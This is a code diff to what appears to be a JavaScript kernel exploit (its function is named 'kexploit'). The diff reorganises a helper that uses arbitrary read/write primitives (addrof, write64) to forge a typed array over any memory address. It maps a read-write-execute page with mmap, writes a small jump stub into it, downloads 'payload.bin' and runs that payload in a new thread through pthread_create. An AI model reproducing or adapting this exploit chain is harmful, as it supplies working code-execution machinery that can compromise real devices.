@@ -1803,50 +1803,36 @@ export async function kexploit() {
         close(sd);
     }
 }
-
+function array_from_address(addr, size) {
+var og_array = new Uint32Array(0x1000);
+var og_array_i = mem.addrof(og_array).add(0x10);
+mem.write64(og_array_i, addr);
+mem.write32(og_array_i.add(0x8), size);
+mem.write32(og_array_i.add(0xC), 0x1);
+nogc.push(og_array);
+return og_array;
+}
 
 kexploit().then(() => {
+    
  const PROT_READ = 1;
-    const PROT_WRITE = 2;
-    const PROT_EXEC = 4;
+ const PROT_WRITE = 2;
+ const PROT_EXEC = 4;
 
 var loader_addr = chain.sysp(
   'mmap',
-  new Int(0, 0),                         // lascia al kernel l’indirizzo libero
-  0x1000,                                // dimensione = 4 KB
-  PROT_READ | PROT_WRITE | PROT_EXEC,    // permessi R+W+X
-  0x41000,                               // MAP_ANONYMOUS | MAP_PRIVATE
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
   -1,
   0
 );
 
-
 var stub_dword = 0x00C3E7FF;
-
-
 var tmpStubArray = array_from_address(loader_addr, 1);
 tmpStubArray[0] = stub_dword;
-
-
-var payload_loader = loader_addr;
-
-       
-function array_from_address(addr, size) {
-
-var og_array = new Uint32Array(0x1000);
-var og_array_i = mem.addrof(og_array).add(0x10);
-
-
-mem.write64(og_array_i, addr);
-
-mem.write32(og_array_i.add(0x8), size);
-
-mem.write32(og_array_i.add(0xC), 0x1);
-
-nogc.push(og_array);
-return og_array;
-}
-    
+   
 var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
  req.open('GET','payload.bin');
@@ -1868,7 +1854,7 @@ var req = new XMLHttpRequest();
         'pthread_create',
         pthread,
         0,
-        payload_loader,
+        loader_addr,
         payload_buffer,
     );	
 }
